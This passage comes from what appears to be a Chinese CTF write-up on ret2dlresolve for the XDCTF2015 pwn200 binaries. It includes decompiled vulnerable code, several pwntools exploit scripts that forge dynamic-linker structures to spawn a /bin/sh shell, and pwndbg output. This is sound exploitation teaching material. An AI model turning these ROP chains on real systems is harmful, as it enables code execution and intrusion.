class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload2=p64(<span class="number">0xdeadbeef</span>)+p64(pop_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0</span>)+p64(strtab)+p64(<span class="number">0x10</span>)</span><br><span class="line">payload2+=p64(move_addr)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">7</span>)+p64(vuln_addr)+fake_dynstr</span><br><span class="line">num=<span class="built_in">len</span>(payload2)</span><br><span class="line">payload2+=<span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">payload3=p64(bss_addr+<span class="number">0x300</span>+<span class="number">136</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x00400773</span> </span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(bss_addr+<span class="number">0x300</span>+num)+p64(<span class="number">0x4004E6</span>)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>思路二：</p>
+<p>首先篡改strtab指向new_stack+0x10(bss_addr+0x200),然后在new_stack处写上<code>/bin/sh\x00</code>,在new_stack+0x10处写上fake_dynstr（将read改为system）。则此时strtab指向fake_dynstr,此时调用read@plt+6(实际为system)，并将参数设置为写在new_stack处的”/bin/sh\x00”，即可调用system(“/bin/sh\x00”)。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#coding=utf-8</span></span><br><span class="line">from pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./main_no_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_no_relro_64&#x27;</span>)</span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line"></span><br><span class="line">leave_ret=<span class="number">0x000000000040063c</span></span><br><span class="line">pop_addr=<span class="number">0x40076a</span>  </span><br><span class="line">move_addr=<span class="number">0x400750</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">.text:<span class="number">0000000000400750</span> loc_400750:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>↓j</span><br><span class="line">.text:<span class="number">0000000000400750</span>                 mov     rdx, r15</span><br><span class="line">.text:<span class="number">0000000000400753</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400756</span>                 mov     edi, r13d</span><br><span class="line">.text:<span class="number">0000000000400759</span>                 call    ds:(__frame_dummy_init_array_entry - <span class="number">6008F</span>8h)[r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040075</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400761</span>                 cmp     rbp, rbx</span><br><span class="line">.text:<span class="number">0000000000400764</span>                 jnz     <span class="keyword">short</span> loc_400750</span><br><span class="line">.text:<span class="number">0000000000400766</span></span><br><span class="line">.text:<span class="number">0000000000400766</span> loc_400766:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>↑j</span><br><span class="line">.text:<span class="number">0000000000400766</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040076</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040076B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040076</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040076</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400770</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400772</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400774</span>                 retn</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">new_stack=bss_addr+<span class="number">0x200</span></span><br><span class="line">pop_rbp=<span class="number">0x00400588</span></span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">strtab=<span class="number">0x0000000000600988</span>+<span class="number">0x8</span></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload1+=p64(pop_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0</span>)+p64(strtab)+p64(<span class="number">0x8</span>)</span><br><span class="line">payload1+=p64(move_addr)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">7</span>)+p64(vuln_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.send(p64(new_stack+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)</span><br><span class="line">payload2+=p64(pop_addr)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0</span>)+p64(new_stack)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(move_addr)+<span class="string">&#x27;a&#x27;</span>*(<span class="number">8</span>*<span class="number">7</span>)+p64(vuln_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload3=<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+fake_dynstr </span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400773</span>     <span class="meta">#pop rdi ; ret</span></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(new_stack)+p64(read_plt+<span class="number">6</span>)+p64(<span class="number">0</span>)</span><br><span class="line">p.send(payload4)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h4><h5 id="保护检查-1"><a href="#保护检查-1" class="headerlink" title="保护检查"></a>保护检查</h5><p><img src="C:\Users\wqf\AppData\Roaming\Typora\typora-user-images\image-20220702193429817.png" alt="image-20220702193429817"></p>
+<h5 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>);</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  v14 = <span class="number">0LL</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  write(<span class="number">1</span>, buf, v3);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在栈溢出漏洞</p>
+<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>利用思路与32位的一样。一步一步地进行伪造</p>
+<h6 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h6><p>伪造relro_arg</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。</span></span><br><span class="line"><span class="comment">#此程序中没有pop rdx的gadget</span></span><br><span class="line"><span class="comment">#ret2csu调用read</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new_stack=bss_addr+<span class="number">0x200</span></span><br><span class="line">pop_rbp=<span class="number">0x00000000004005b8</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004007a1</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040066c</span></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt0=<span class="number">0x400500</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)     <span class="comment">#向new_stack中写入/bin/sh\x00</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(plt0)+p64(<span class="number">0</span>)</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\wqf\AppData\Roaming\Typora\typora-user-images\image-20220702214841894.png" alt="image-20220702214841894"></p>
+<h6 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h6><p>伪造Elf64_Rel结构体</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。</span></span><br><span class="line"><span class="comment">#此程序中没有pop rdx的gadget</span></span><br><span class="line"><span class="comment">#ret2csu调用read</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new_stack=bss_addr+<span class="number">0x200</span></span><br><span class="line">pop_rbp=<span class="number">0x00000000004005b8</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004007a1</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040066c</span></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt0=<span class="number">0x400500</span></span><br><span class="line">rel_plt=elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#601018h, 100000007h, 0</span></span><br><span class="line">fake_r_offset=<span class="number">0x601018</span></span><br><span class="line">fake_r_info=<span class="number">0x100000007</span></span><br><span class="line">fake_r_addend=<span class="number">0x0</span></span><br><span class="line">fake_write_rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)     <span class="comment">#向new_stack中写入/bin/sh\x00</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(new_stack+<span class="number">0x10</span>)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)) <span class="comment">#第一个read（0,new_stack,)</span></span><br><span class="line"></span><br><span class="line">fake_write_rela_addr=new_stack+<span class="number">0x10</span></span><br><span class="line">fake_reloc_arg=(fake_write_rela_addr-rel_plt)/<span class="number">24</span>  <span class="comment">#64位采用的是索引</span></span><br><span class="line"></span><br><span class="line">p.sendline(fake_write_rela)                 <span class="comment">#第二个read（0，new_stack+0x10,)</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(plt0)+p64(fake_reloc_arg)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h6 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h6><p>伪造ELF64_Sym结构体</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main_partial_relro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。</span></span><br><span class="line"><span class="comment">#此程序中没有pop rdx的gadget</span></span><br><span class="line"><span class="comment">#ret2csu调用read</span></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new_stack=bss_addr+<span class="number">0x200</span></span><br><span class="line">pop_rbp=<span class="number">0x00000000004005b8</span></span><br><span class="line">pop_rdi=<span class="number">0x00000000004007a3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x00000000004007a1</span></span><br><span class="line">leave_ret=<span class="number">0x000000000040066c</span></span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">vuln_addr=elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt0=<span class="number">0x400500</span></span><br><span class="line">rel_plt=elf.get_section_by_name(<span class="string">&#x27;.rela.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Elf64_Sym &lt;offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0&gt; ; &quot;write&quot;</span></span><br><span class="line"><span class="comment">#LOAD:00000000004003D5 aWrite          db &#x27;write&#x27;,0            ; DATA XREF: LOAD:00000000004002D8↑o</span></span><br><span class="line">fake_st_name=<span class="number">0x4003D5</span>-<span class="number">0x400398</span></span><br><span class="line">fake_st_info=<span class="number">0x12</span></span><br><span class="line">fake_st_other=<span class="number">0x0</span></span><br><span class="line">fake_st_shndx=<span class="number">0x0</span></span><br><span class="line">fake_st_value=<span class="number">0x0</span></span><br><span class="line">fake_st_size=<span class="number">0x0</span></span><br><span class="line">fake_write_sym=p32(fake_st_name)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)+p64(fake_st_value)+p64(fake_st_size)</span><br><span class="line">fake_write_sym_addr=new_stack+<span class="number">0x10</span></span><br><span class="line">align=<span class="number">0x18</span>-((fake_write_sym_addr-dynsym)&amp;<span class="number">0xf</span>)</span><br><span class="line">fake_write_sym_addr+=align</span><br><span class="line"></span><br><span class="line">fake_r_offset=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym_index=(fake_write_sym_addr-dynsym)/<span class="number">0x18</span></span><br><span class="line">fake_r_info=dynsym_index&lt;&lt;<span class="number">32</span>|<span class="number">7</span></span><br><span class="line">fake_r_addend=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">fake_write_rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)</span><br><span class="line">fake_write_rela_addr=new_stack+<span class="number">0x10</span>+<span class="built_in">len</span>(fake_write_sym)+align</span><br><span class="line">fake_reloc_arg=(fake_write_rela_addr-rel_plt)/<span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)     <span class="comment">#向new_stack中写入/bin/sh\x00</span></span><br><span class="line">payload1+=p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(fake_write_sym_addr)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr) <span class="comment">#new_stack+0x10中写入fake_write_Elf64_Sym</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.send(fake_write_sym)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(fake_write_rela_addr)+p64(<span class="number">0xdeadbeef</span>)+p64(read_plt)+p64(main_addr) <span class="comment">#写入fake_write_Elf64_rela</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload2)</span><br><span class="line">pause()</span><br><span class="line">p.send(fake_write_rela)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(new_stack)+p64(<span class="number">0xdeadbeef</span>)+p64(plt0)+p64(fake_reloc_arg)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>执行上述exp会发生报错</p>
+<p><img src="C:\Users\wqf\AppData\Roaming\Typora\typora-user-images\image-20220702222849521.png" alt="image-20220702222849521"></p>
+<p>通过调试，我们发现，程序是在获取对应的版本号</p>
+<ul>
+<li>rax 为 0x4003f6，指向版本号数组</li>
+<li> rdx 为 0x155f1，符号表索引，同时为版本号索引</li>
+</ul>
+<p>同时 rax + rdx*2 为 0x42afd8，而这个地址并不在映射的内存中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print /x $rax + $rdx*<span class="number">2</span></span><br><span class="line">$<span class="number">1</span> = <span class="number">0x42afd8</span></span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          <span class="number">0x400000</span>           <span class="number">0x401000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">64</span>/partial-relro/main_partial_relro_64</span><br><span class="line">          <span class="number">0x600000</span>           <span class="number">0x601000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">64</span>/partial-relro/main_partial_relro_64</span><br><span class="line">          <span class="number">0x601000</span>           <span class="number">0x602000</span> rw-p     <span class="number">1000</span> <span class="number">1000</span>   